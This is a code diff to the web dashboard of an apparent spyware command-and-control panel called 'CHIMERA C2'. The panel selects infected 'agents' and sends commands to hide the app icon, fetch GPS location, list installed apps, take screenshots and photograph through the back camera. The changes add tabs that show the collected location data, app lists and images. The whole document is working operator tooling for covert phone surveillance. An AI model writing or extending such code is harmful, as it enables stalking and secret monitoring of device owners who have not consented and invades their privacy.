@@ -17,24 +17,24 @@
         * { box-sizing: border-box; }
         body {
             font-family: var(--font-mono); background-color: var(--bg-primary); color: var(--text-primary);
-            margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px;
+            margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px;
         }
         .dashboard-container {
-            width: 100%; max-width: 700px; background-color: var(--bg-secondary); border-radius: 12px;
+            width: 100%; max-width: 900px; background-color: var(--bg-secondary); border-radius: 12px;
             border: 1px solid var(--border-color); box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
             overflow: hidden; animation: fadeIn 1s ease-in-out;
         }
         @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
         .card-header {
-            padding: 24px 32px; text-align: center; font-family: var(--font-display); font-size: 1.5em;
+            padding: 20px 28px; text-align: center; font-family: var(--font-display); font-size: 1.4em;
             color: var(--accent-cyan); text-shadow: 0 0 10px var(--glow-cyan);
             border-bottom: 1px solid var(--border-color); letter-spacing: 2px;
         }
-        .card-body { padding: 32px; }
+        .card-body { padding: 28px; }
         .tabs { display: flex; border-bottom: 1px solid var(--border-color); margin-bottom: 24px; }
         .tab-button {
-            padding: 14px 22px; cursor: pointer; background: none; border: none; color: var(--text-secondary);
-            font-size: 1em; font-weight: 600; font-family: var(--font-mono);
+            padding: 12px 18px; cursor: pointer; background: none; border: none; color: var(--text-secondary);
+            font-size: 0.9em; font-weight: 600; font-family: var(--font-mono);
             border-bottom: 3px solid transparent; transition: all 0.2s ease;
         }
         .tab-button:hover { color: var(--text-primary); }
@@ -42,27 +42,33 @@
         .tab-content { display: none; }
         .tab-content.active { display: block; animation: tabFade 0.5s; }
         @keyframes tabFade { from { opacity: 0; } to { opacity: 1; } }
-        .form-group { margin-bottom: 24px; }
-        .form-group label { display: block; margin-bottom: 10px; font-weight: 600; color: var(--text-secondary); }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: var(--text-secondary); font-size: 0.9em; }
         select {
-            width: 100%; padding: 14px; background-color: var(--bg-primary); border: 1px solid var(--border-color);
+            width: 100%; padding: 12px; background-color: var(--bg-primary); border: 1px solid var(--border-color);
             border-radius: 8px; color: var(--text-primary); font-size: 1em; font-family: var(--font-mono);
         }
         select:focus { outline: none; border-color: var(--accent-cyan); box-shadow: 0 0 10px var(--glow-cyan); }
-        button#btnTransmit {
-            width: 100%; padding: 16px; background: linear-gradient(90deg, #00c3ff, #007bff);
-            border: none; border-radius: 8px; color: white; font-size: 1.1em; font-weight: 600;
+        button.transmit-btn {
+            width: 100%; padding: 14px; background: linear-gradient(90deg, #00c3ff, #007bff);
+            border: none; border-radius: 8px; color: white; font-size: 1em; font-weight: 600;
             cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 15px var(--glow-cyan);
         }
-        button#btnTransmit:hover { transform: scale(1.02); box-shadow: 0 0 25px var(--glow-cyan); }
-        #data-log-output {
+        button.transmit-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px var(--glow-cyan); }
+        .data-output-container {
             height: 400px; background-color: var(--bg-primary); border-radius: 8px;
             border: 1px solid var(--border-color); padding: 15px; overflow-y: auto;
-            white-space: pre-wrap; word-wrap: break-word; line-height: 1.7;
         }
+        .intel-card { background-color: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 8px; padding: 15px; margin-bottom: 15px; }
+        .intel-card h3 { margin: 0 0 10px; color: var(--accent-cyan); font-size: 1em; }
+        .intel-card p { margin: 0; line-height: 1.6; }
+        .visuals-gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; }
+        .visual-item img { width: 100%; border-radius: 4px; border: 1px solid var(--border-color); }
+        .visual-item p { text-align: center; font-size: 0.8em; color: var(--text-secondary); margin-top: 5px; }
+        .raw-log-entry { white-space: pre-wrap; word-wrap: break-word; line-height: 1.7; }
         .status-bar {
-            margin-top: 24px; padding: 14px; border-radius: 8px; text-align: center;
-            font-weight: 600; transition: all 0.3s ease; border: 1px solid transparent;
+            margin-top: 24px; padding: 12px; border-radius: 8px; text-align: center;
+            font-weight: 600; transition: all 0.3s ease; border: 1px solid transparent; font-size: 0.9em;
         }
         .status-idle { border-color: var(--border-color); color: var(--text-secondary); }
         .status-sending { border-color: var(--accent-cyan); color: var(--accent-cyan); }
@@ -75,26 +81,42 @@
         <div class="card-header">CHIMERA C2</div>
         <div class="card-body">
             <nav class="tabs">
-                <button class="tab-button active" data-tab="control">CONTROL</button>
-                <button class="tab-button" data-tab="datalog">DATA LOG</button>
+                <button class="tab-button active" data-tab="control-tab">CONTROL</button>
+                <button class="tab-button" data-tab="intel-tab">INTEL</button>
+                <button class="tab-button" data-tab="visuals-tab">VISUALS</button>
+                <button class="tab-button" data-tab="raw-logs-tab">RAW LOGS</button>
             </nav>
-            <div id="control" class="tab-content active">
+            
+            <div id="control-tab" class="tab-content active">
                 <div class="form-group"><label for="selectDevice">SELECT AGENT</label><select id="selectDevice"><option>-- Searching... --</option></select></div>
-                <div class="form-group"><label for="selectCommand">SELECT COMMAND</label><select id="selectCommand"><optgroup label="Stealth"><option value="toggle_icon_hide">Hide App Icon</option><option value="toggle_icon_show">Show App Icon</option></optgroup><optgroup label="Recon"><option value="get_location">Get Location</option><option value="list_apps">List Installed Apps</option></optgroup><optgroup label="Surveillance"><option value="screenshot">Take Screenshot</option><option value="picture_back">Take Picture (Back Camera)</option></optgroup></select></div>
-                <button id="btnTransmit">TRANSMIT</button>
+                <div class="form-group"><label for="selectCommand">SELECT COMMAND</label><select id="selectCommand"><optgroup label="Stealth"><option value="toggle_icon_hide">Hide App Icon</option><option value="toggle_icon_show">Show App Icon</option></optgroup><optgroup label="Recon"><option value="get_location">Get Location</option><option value="list_apps">List Installed Apps</option></optgroup><optgroup label="Surveillance"><option value="screenshot">Take Screenshot</option><option value="picture_back">Take Picture (Back)</option></optgroup></select></div>
+                <button id="btnTransmit" class="transmit-btn">TRANSMIT</button>
             </div>
-            <div id="datalog" class="tab-content">
-                <div class="form-group"><label>INCOMING DATA</label><div id="data-log-output">Awaiting data packets...</div></div>
+
+            <div id="intel-tab" class="tab-content">
+                 <div id="intel-output" class="data-output-container">Awaiting structured data...</div>
             </div>
+
+            <div id="visuals-tab" class="tab-content">
+                <div id="visuals-output" class="data-output-container visuals-gallery">Awaiting visual data...</div>
+            </div>
+
+            <div id="raw-logs-tab" class="tab-content">
+                <div id="raw-logs-output" class="data-output-container">Awaiting raw logs...</div>
+            </div>
+            
             <div id="statusBar" class="status-bar status-idle">SYSTEM IDLE</div>
         </div>
     </div>
+
     <script>
         const selectDevice = document.getElementById('selectDevice');
         const selectCommand = document.getElementById('selectCommand');
         const btnTransmit = document.getElementById('btnTransmit');
         const statusBar = document.getElementById('statusBar');
-        const dataLogOutput = document.getElementById('data-log-output');
+        const intelOutput = document.getElementById('intel-output');
+        const visualsOutput = document.getElementById('visuals-output');
+        const rawLogsOutput = document.getElementById('raw-logs-output');
         const tabs = document.querySelectorAll('.tab-button');
         const tabContents = document.querySelectorAll('.tab-content');
         const API_BASE = '/.netlify/functions';
@@ -117,7 +139,7 @@
                 selectDevice.innerHTML = '<option value="" disabled selected>-- Select an Agent --</option>';
                 if (devices.length === 0) { selectDevice.innerHTML = '<option value="" disabled selected>-- No Agents Found --</option>'; }
                 else { devices.forEach(device => { const option = document.createElement('option'); option.value = device.token; option.textContent = device.deviceId; selectDevice.appendChild(option); }); }
-            } catch (error) { setStatus(`Error fetching agents`, 'error'); selectDevice.innerHTML = '<option value="" disabled selected>-- Error --</option>'; }
+            } catch (error) { setStatus(`Error fetching agents: ${error.message}`, 'error'); selectDevice.innerHTML = '<option value="" disabled selected>-- Error --</option>'; }
         }
 
         async function transmitCommand() {
@@ -127,47 +149,86 @@
             if (commandValue.startsWith('toggle_icon')) { action = 'toggle_icon'; payload.show = commandValue.endsWith('show') ? 'true' : 'false'; }
             else if (commandValue === 'picture_back') { action = 'picture'; payload.camera_id = '0'; }
             else { action = commandValue; }
-            setStatus('Transmitting...', 'sending');
+            setStatus(`Transmitting [${action}]...`, 'sending');
             try {
                 const response = await fetch(`${API_BASE}/send-command`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token, action, ...payload }) });
                 const result = await response.json();
                 if (!response.ok) throw new Error(result.error || `Server ${response.status}`);
-                setStatus(`[${action}] signal transmitted successfully.`, 'success');
-                setTimeout(fetchDeviceData, 3000);
+                setStatus(`Signal sent. Querying for results in 5s...`, 'success');
+                setTimeout(fetchDeviceData, 5000);
             } catch (error) { setStatus(`Transmission failed: ${error.message}`, 'error'); }
         }
 
         async function fetchDeviceData() {
             const token = selectDevice.value; if(!token) return; const device = devices.find(d => d.token === token); if(!device) return;
-            setStatus('Querying for data packets...', 'sending'); document.querySelector('.tab-button[data-tab="datalog"]').click();
+            setStatus('Querying for data packets...', 'sending');
             try {
                 const response = await fetch(`${API_BASE}/get-device-data?deviceId=${device.deviceId}`);
                 if (!response.ok) throw new Error(`Server ${response.status}`);
                 const data = await response.json();
-                if(data.length > 0) {
-                    dataLogOutput.innerHTML = '';
-                    data.forEach(item => {
-                        const logEntry = document.createElement('div');
-                        let payloadContent;
-                        // --- NEW: Data Formatting Logic ---
-                        if (typeof item.payload === 'string') {
-                            payloadContent = item.payload.replace(/\\n/g, '\n');
-                        } else {
-                            payloadContent = JSON.stringify(item.payload, null, 2);
-                        }
-                        // --- End of New Logic ---
-                        logEntry.innerHTML = `<strong>[${item.dataType.toUpperCase()}]</strong> - ${new Date(item.timestamp).toLocaleString()}\n<pre>${payloadContent}</pre><hr style="border-color: var(--border-color); margin: 10px 0;">`;
-                        dataLogOutput.appendChild(logEntry);
-                    });
-                     setStatus(`Received ${data.length} data packets.`, 'success');
-                } else {
-                    dataLogOutput.textContent = 'No data logs found for this agent.';
-                    setStatus('Query complete. No new data.', 'idle');
-                }
+                
+                intelOutput.innerHTML = '';
+                visualsOutput.innerHTML = '';
+                rawLogsOutput.innerHTML = '';
+                let intelCount = 0, visualsCount = 0, logsCount = 0;
+
+                data.forEach(item => {
+                    const dataType = item.dataType;
+                    if (dataType === 'location' || dataType === 'installed_apps') {
+                        renderIntel(item);
+                        intelCount++;
+                    } else if (dataType === 'screenshot' || dataType === 'picture') {
+                        renderVisual(item);
+                        visualsCount++;
+                    } else {
+                        renderRawLog(item);
+                        logsCount++;
+                    }
+                });
+
+                if (intelCount === 0) intelOutput.innerHTML = 'No structured data found for this agent.';
+                if (visualsCount === 0) visualsOutput.innerHTML = 'No visual data found for this agent.';
+                if (logsCount === 0) rawLogsOutput.innerHTML = 'No raw logs found for this agent.';
+
+                setStatus(`Query complete. Found ${intelCount} intel, ${visualsCount} visuals, ${logsCount} logs.`, 'success');
             } catch (error) { setStatus(`Failed to fetch data: ${error.message}`, 'error'); }
         }
 
+        function renderIntel(item) {
+            const card = document.createElement('div');
+            card.className = 'intel-card';
+            let content = '';
+            if (item.dataType === 'location') {
+                content = `<h3>Location Fix</h3><p>Lat: ${item.payload.latitude}<br>Lon: ${item.payload.longitude}<br>Accuracy: ${item.payload.accuracy}m</p>`;
+            } else if (item.dataType === 'installed_apps') {
+                content = '<h3>Installed Applications</h3>';
+                const apps = Object.entries(item.payload).map(([pkg, name]) => `<li>${name} <small>(${pkg})</small></li>`).join('');
+                content += `<ul style="padding-left: 20px; margin:0;">${apps}</ul>`;
+            }
+            card.innerHTML = content + `<small style="display:block; text-align:right; color:var(--text-secondary); margin-top:10px;">${new Date(item.timestamp).toLocaleString()}</small>`;
+            intelOutput.appendChild(card);
+        }
+        
+        function renderVisual(item) {
+            const visualDiv = document.createElement('div');
+            visualDiv.className = 'visual-item';
+            visualDiv.innerHTML = `
+                <img src="data:image/jpeg;base64,${item.payload}" class="log-image" alt="${item.dataType}">
+                <p>${item.dataType.toUpperCase()} @ ${new Date(item.timestamp).toLocaleTimeString()}</p>
+            `;
+            visualsOutput.appendChild(visualDiv);
+        }
+
+        function renderRawLog(item) {
+            const logEntry = document.createElement('div');
+            logEntry.className = 'raw-log-entry';
+            let payloadContent = (typeof item.payload === 'string') ? item.payload.replace(/\\n/g, '\n') : JSON.stringify(item.payload, null, 2);
+            logEntry.innerHTML = `<strong>[${item.dataType.toUpperCase()}]</strong> - ${new Date(item.timestamp).toLocaleString()}\n<pre style="background: var(--bg-primary); padding: 5px; border-radius: 4px;">${payloadContent}</pre><hr style="border-color: var(--border-color); margin: 10px 0;">`;
+            rawLogsOutput.appendChild(logEntry);
+        }
+
         btnTransmit.addEventListener('click', transmitCommand);
+        selectDevice.addEventListener('change', fetchDeviceData); // Fetch data when a new device is selected
         window.onload = fetchDevices;
     </script>
 </body>
